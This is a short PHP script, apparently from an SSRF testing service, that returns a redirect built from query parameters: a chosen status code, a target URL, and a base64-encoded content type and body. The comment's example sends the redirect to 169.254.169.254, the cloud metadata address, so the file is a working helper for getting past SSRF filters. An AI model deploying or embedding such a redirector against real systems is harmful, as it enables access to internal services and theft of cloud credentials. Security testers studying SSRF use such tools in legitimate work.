<?php
#Custom 322 response with valid json body
#https://ssrf.localdomain.pw/custom-30x/?code=332&url=http://169.254.169.254/&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json
header("HTTP/1.1 ".$_GET["code"]." Found");
header("Location: ".$_GET["url"]);
header("Content-Type:".base64_decode($_GET["content-type"]));
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Pragma: no-cache");
echo base64_decode($_GET["body"]);
